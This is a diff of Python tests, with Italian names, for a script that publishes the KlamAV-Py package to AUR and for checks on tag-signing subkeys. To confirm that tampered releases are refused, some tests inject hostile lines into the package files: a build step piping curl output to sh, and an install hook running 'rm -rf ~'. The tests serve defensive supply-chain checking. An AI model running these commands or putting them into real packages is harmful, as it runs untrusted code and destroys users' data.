@@ -114,7 +114,8 @@ def _project(tmp_path: Path, keys: Keyring) -> Path:
     repo = tmp_path / "progetto"
     (repo / "tools").mkdir(parents=True)
     (repo / "arch").mkdir()
-    for name in ("verify-tag.sh", "sign-release.sh", "publish-aur.sh", "release-keys.sh"):
+    for name in ("verify-tag.sh", "sign-release.sh", "publish-aur.sh", "release-keys.sh",
+                 "aur-release.sh"):
         shutil.copy(TOOLS / name, repo / "tools" / name)
     shutil.copy(keys.pubkey, repo / "arch" / "klamav-py-release-key.asc")
     (repo / "README").write_text("x")
@@ -251,6 +252,115 @@ def test_srcinfo_non_allineato_non_pubblicato(tmp_path, keys):
     proc = _run(["tools/publish-aur.sh", str(aur)], tmp_path, cwd=repo, check=False,
                 AUR_REMOTE=str(tmp_path / "non-esiste.git"))
     assert proc.returncode != 0 and ".SRCINFO non allineato" in proc.stderr
+
+
+# -- tools/aur-release.sh: dalla macchina del maintainer --------------------------
+
+_URL = "https://github.com/esempio/KlamAV-Py"
+
+
+def _release(tmp_path, keys, *, key=None) -> tuple[Path, Path]:
+    """Progetto con arch/PKGBUILD 1.0.0 e il tag v1.0.0, più l'artefatto
+    «aur» che la CI avrebbe prodotto da quel tag."""
+    repo = _project(tmp_path, keys)
+    (repo / "arch" / "PKGBUILD").write_text(
+        f'pkgname=klamav-py\npkgver=1.0.0\npkgrel=1\nurl="{_URL}"\n'
+        "source=(\"$pkgname::git+$url.git#tag=v$pkgver?signed\")\nsha256sums=('SKIP')\n"
+        f"validpgpkeys=('{keys.release}') # prova\n")
+    (repo / "arch" / "klamav-py.install").write_text("post_install() { :; }\n")
+    _run([*_git(repo), "add", "arch"], tmp_path)
+    _run([*_git(repo), "commit", "-q", "-m", "1.0.0"], tmp_path)
+    _tag(repo, tmp_path, keys, "v1.0.0", key=f"{key or keys.tag_subkey}!")
+    art = tmp_path / "artefatto"
+    art.mkdir()
+    for f in ("PKGBUILD", "klamav-py.install"):
+        shutil.copy(repo / "arch" / f, art / f)
+    (art / ".SRCINFO").write_text(
+        "pkgbase = klamav-py\n\tpkgver = 1.0.0\n\tpkgrel = 1\n"
+        f"\tsource = klamav-py::git+{_URL}.git#tag=v1.0.0?signed\n"
+        f"\tvalidpgpkeys = {keys.release}\n\tsha256sums = SKIP\n\npkgname = klamav-py\n")
+    (art / "klamav-py-1.0.0-1-any.pkg.tar.zst").write_bytes(b"pacchetto")
+    return repo, art
+
+
+def _aur_release(tmp_path, keys, repo, art, check=True):
+    remote = tmp_path / "aur.git"
+    if not remote.exists():
+        _run(["git", "init", "-q", "--bare", "-b", "master", str(remote)], tmp_path)
+    return _run(["tools/aur-release.sh", "v1.0.0"], tmp_path, cwd=repo, check=check,
+                **keys.roles(), KLAMAV_AUR_ARTIFACT=str(art), AUR_REMOTE=str(remote))
+
+
+def test_aur_release_pubblica_i_file_del_tag(tmp_path, keys):
+    repo, art = _release(tmp_path, keys)
+    out = _aur_release(tmp_path, keys, repo, art)
+    assert "pubblicato su AUR: klamav-py 1.0.0" in out.stdout
+    files = _run(["git", "-C", str(tmp_path / "aur.git"), "ls-tree", "--name-only", "master"],
+                 tmp_path).stdout
+    assert files.split() == [".SRCINFO", "PKGBUILD", "klamav-py.install"]  # niente pacchetto
+
+
+@pytest.mark.parametrize("caso", ["PKGBUILD", "install", "srcinfo-versione", "srcinfo-sorgente",
+                                  "srcinfo-chiave", "srcinfo-doppio", "tag-della-ci"])
+def test_aur_release_rifiuta(tmp_path, keys, caso):
+    repo, art = _release(tmp_path, keys,
+                         key=keys.ci_subkey if caso == "tag-della-ci" else None)
+    srcinfo = art / ".SRCINFO"
+    if caso == "PKGBUILD":
+        (art / "PKGBUILD").write_text((art / "PKGBUILD").read_text() + "build() { curl x | sh; }\n")
+    elif caso == "install":
+        (art / "klamav-py.install").write_text("post_install() { rm -rf ~; }\n")
+    elif caso == "srcinfo-versione":
+        srcinfo.write_text(srcinfo.read_text().replace("pkgver = 1.0.0", "pkgver = 0.9.0"))
+    elif caso == "srcinfo-sorgente":
+        srcinfo.write_text(srcinfo.read_text().replace(_URL, "https://example.org/altro"))
+    elif caso == "srcinfo-chiave":
+        srcinfo.write_text(srcinfo.read_text().replace(keys.release, keys.other))
+    elif caso == "srcinfo-doppio":
+        srcinfo.write_text(srcinfo.read_text().replace(
+            "\tsha256sums = SKIP\n", "\tsource = https://example.org/x.tar\n\tsha256sums = SKIP\n"))
+    proc = _aur_release(tmp_path, keys, repo, art, check=False)
+    assert proc.returncode != 0, proc.stdout
+    assert "pubblicato su AUR" not in proc.stdout
+    log = _run(["git", "-C", str(tmp_path / "aur.git"), "log", "--oneline", "--all"],
+               tmp_path).stdout
+    assert log == ""
+
+
+def test_pkgbuild_accetta_solo_le_sottochiavi_dei_tag():
+    # prepare() del PKGBUILD rifiuta un tag firmato dalla sottochiave della
+    # CI, che makepkg con validpgpkeys accetterebbe: le sottochiavi elencate
+    # devono essere quelle di tools/release-keys.sh.
+    roles = dict(re.findall(r'^(\w+)="\$\{KLAMAV_\w+:-([0-9A-F ]+)\}"',
+                            (TOOLS / "release-keys.sh").read_text(), re.M))
+    pkgbuild = (ROOT / "arch/PKGBUILD").read_text()
+    match = re.search(r"^_tag_subkeys=\(([^)]*)\)", pkgbuild, re.M)
+    assert match
+    assert re.findall(r"[0-9A-F]{40}", match.group(1)) == roles["TAG_SIGNING_SUBKEYS"].split()
+    assert roles["CI_SIGNING_SUBKEY"] not in pkgbuild
+    assert re.search(r"^prepare\(\) \{", pkgbuild, re.M)
+
+
+def test_pkgbuild_prepare_con_tag_veri(tmp_path, keys):
+    # prepare() eseguito davvero, su un clone con un tag firmato da ciascuna
+    # sottochiave: passa solo quello della sottochiave dei tag.
+    repo = _project(tmp_path, keys)
+    _tag(repo, tmp_path, keys, "v1.0.0", key=f"{keys.tag_subkey}!")
+    _tag(repo, tmp_path, keys, "v2.0.0", key=f"{keys.ci_subkey}!")
+    srcdir = tmp_path / "src"
+    srcdir.mkdir()
+    (srcdir / "klamav-py").symlink_to(repo)
+    pkgbuild = (ROOT / "arch/PKGBUILD").read_text()
+    pkgbuild = re.sub(r"^validpgpkeys=.*$", f"validpgpkeys=('{keys.release}')", pkgbuild, flags=re.M)
+    pkgbuild = re.sub(r"^_tag_subkeys=.*$", f"_tag_subkeys=('{keys.tag_subkey}')", pkgbuild,
+                      flags=re.M)
+    (tmp_path / "PKGBUILD").write_text(pkgbuild)
+    for version, ok in (("1.0.0", True), ("2.0.0", False)):
+        proc = _run(["bash", "-c", f'source PKGBUILD; pkgver={version}; srcdir="{srcdir}"; prepare'],
+                    tmp_path, cwd=tmp_path, check=False, GNUPGHOME=str(keys.home))
+        assert (proc.returncode == 0) is ok, proc.stderr
+        if not ok:
+            assert "non è una sottochiave dei tag" in proc.stderr
 
 
 # -- versione e note: sul repository vero ----------------------------------------
